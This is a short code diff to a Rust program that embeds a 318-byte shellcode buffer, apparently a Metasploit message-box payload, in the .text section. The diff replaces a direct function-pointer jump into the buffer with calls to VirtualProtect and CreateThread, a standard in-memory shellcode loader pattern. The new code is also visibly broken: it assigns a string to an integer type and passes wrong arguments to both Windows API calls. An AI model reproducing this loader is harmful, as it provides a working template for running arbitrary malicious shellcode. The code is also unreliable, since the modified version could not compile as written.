@@ -1,4 +1,8 @@
-use std::mem;
+#[cfg(windows)] extern crate winapi;
+
+use winapi::ctypes::{c_ulong};
+use winapi::um::memoryapi::{VirtualProtect};
+use winapi::um::processthreadsapi::{CreateThread};
 
 #[no_mangle]
 #[link_section = ".text"]
@@ -30,7 +34,12 @@ static buf: [u8; 318] = [0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
 0x4d,0x53,0x46,0x21,0x00,0x45,0x72,0x72,0x6f,0x72,0x21,0x00,
 0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00];
 
+
+
 fn main() {
-    let exec_data: extern "C" fn () -> ! = unsafe { mem::transmute(&buf as *const _ as *const ()) };
-    exec_data();
+    let  ufb: c_ulong = "PAGE_EXECUTE";
+    VirtualProtect(&buf, 318, &ufb, &buf);
+    CreateThread(318, 318, &buf);
+
 }
+
